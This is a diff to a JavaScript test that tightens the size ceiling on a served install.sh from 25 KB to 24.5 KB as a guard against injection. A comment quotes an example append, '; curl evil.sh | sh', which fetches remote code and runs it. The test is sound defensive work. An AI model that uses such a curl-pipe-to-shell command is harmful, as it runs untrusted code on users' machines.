@@ -343,7 +343,7 @@ describe("body integrity — install.sh shape and bounded size (H-08)", () => {
     expect(body.length).toBeLessThan(100_000);
   });
 
-  it("install-script body is bounded — under 25 KB tight ceiling (surgical injection guard)", async () => {
+  it("install-script body is bounded — under 24.5 KB tight ceiling (surgical injection guard)", async () => {
     // Per pen-tester Batch-3 review: 100 KB ceiling above is the corruption
     // guard, but a surgical 50-byte append (`; curl evil.sh | sh`) wouldn't
     // trip it. Pin a tight ceiling near install.sh's actual size — any
@@ -352,20 +352,18 @@ describe("body integrity — install.sh shape and bounded size (H-08)", () => {
     //
     // Ceiling history:
     //   - Pre-Tier A: install.sh was ~12 KB. 20 KB ceiling = ~8 KB slack.
-    //   - Post-WOR-673 (A2 env scrub + PATH lockdown): install.sh is ~22 KB.
-    //     36-var unset block + PATH defense + honest proxy_hints + threat-
-    //     model comments add ~10 KB of substantive security content. Bumped
-    //     ceiling to 25 KB to keep ~3 KB slack — still well below the 50-byte
-    //     surgical-injection class this guard catches.
-    //   - Bump again only when Tier A's remaining subtasks (A1, A3, A5)
-    //     ship and grow install.sh further. Each bump must cite the WOR-
-    //     ticket that justifies the growth.
+    //   - Post-WOR-673 (A2 env scrub + PATH lockdown): install.sh is ~23 KB.
+    //     48-var unset block (11 attack classes) + PATH defense + honest
+    //     proxy_hints + threat-model comments add ~11 KB of substantive
+    //     security content. Ceiling at 24.5 KB keeps ~1 KB slack — tight,
+    //     intentionally. Each future bump must cite the WOR ticket that
+    //     justifies the growth and be a real discussion, not a ratchet.
     const res = await SELF.fetch("https://worthless.sh/", {
       headers: { "user-agent": CURL_UA },
     });
     expect(res.status).toBe(200);
     const body = await res.text();
-    expect(body.length).toBeLessThan(25_000);
+    expect(body.length).toBeLessThan(24_500);
   });
 
   it("install-script body Content-Length header matches actual byte length", async () => {
